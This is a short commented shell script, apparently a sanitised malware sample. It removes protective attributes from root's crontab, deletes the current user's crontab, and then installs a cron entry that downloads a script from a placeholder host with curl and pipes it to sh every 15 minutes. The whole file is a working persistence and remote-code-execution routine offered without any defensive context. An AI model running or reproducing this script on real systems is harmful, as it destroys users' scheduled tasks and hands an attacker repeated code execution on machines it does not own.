# Remove 'immutable' and 'append-only' attributes from the root crontab file
chattr -ia /var/spool/cron/root

# Remove the current user's crontab
crontab -r

# Check if a specific string "someStringHereLol" exists in the crontab (excluding the grep process itself)
crontab -l | grep -e "someStringHereLol" | grep -v grep

# If the string was found
if [ $? -eq 0 ]; then
    echo "cron good"  # Print confirmation message
else
    (
        # Dump the current crontab (ignore errors if no crontab exists)
        crontab -l 2>/dev/null

        # Attempt to reach the somewebsite.local and execute somen every 15 mins
        echo "*/15 * * * * curl -fsSL https://somewebsite.local/somen | sh"
        
    ) | crontab -  # Reload crontab with updated content
fi
